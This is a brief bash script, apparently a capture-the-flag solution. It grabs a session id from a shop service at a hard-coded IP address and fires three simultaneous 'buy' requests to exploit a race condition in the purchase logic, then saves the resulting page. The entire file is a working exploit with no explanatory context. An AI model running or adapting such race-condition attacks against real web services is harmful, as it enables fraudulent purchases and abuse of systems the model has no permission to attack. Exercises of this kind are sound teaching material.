#!/bin/bash

out=$(curl http://140.112.31.97:10161)
uid=${out:177:36}
curl http://140.112.31.97:10161/"$uid"/buy?name=Slowpoke & curl http://140.112.31.97:10161/"$uid"/buy?name=Eevee & curl http://140.112.31.97:10161/"$uid"/buy?name=Snorlax
wget http://140.112.31.97:10161/"$uid" -O output
